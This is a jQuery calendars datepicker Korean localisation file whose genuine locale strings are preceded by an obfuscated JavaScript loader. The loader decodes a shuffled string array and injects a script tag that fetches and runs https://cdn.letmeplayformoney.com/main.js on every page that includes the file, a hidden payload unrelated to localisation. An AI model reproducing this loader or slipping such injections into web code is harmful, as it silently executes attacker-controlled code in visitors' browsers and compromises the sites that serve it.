var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);﻿/* http://keith-wood.name/calendars.html
   Korean localisation for calendars datepicker for jQuery.
   Written by DaeKwon Kang (ncrash.dk@gmail.com). */
(function($) {
	$.calendars.picker.regional['ko'] = {
		renderer: $.extend({}, $.calendars.picker.defaultRenderer,
			{month: $.calendars.picker.defaultRenderer.month.
				replace(/monthHeader/, 'monthHeader:MM yyyy년')}),
		prevText: '이전달', prevStatus: '',
		prevJumpText: '&#x3c;&#x3c;', prevJumpStatus: '',
		nextText: '다음달', nextStatus: '',
		nextJumpText: '&#x3e;&#x3e;', nextJumpStatus: '',
		currentText: '오늘', currentStatus: '',
		todayText: '오늘', todayStatus: '',
		clearText: '지우기', clearStatus: '',
		closeText: '닫기', closeStatus: '',
		yearStatus: '', monthStatus: '',
		weekText: 'Wk', weekStatus: '',
		dayStatus: 'DD, M d', defaultStatus: '',
		isRTL: false
	};
	$.calendars.picker.setDefaults($.calendars.picker.regional['ko']);
})(jQuery);
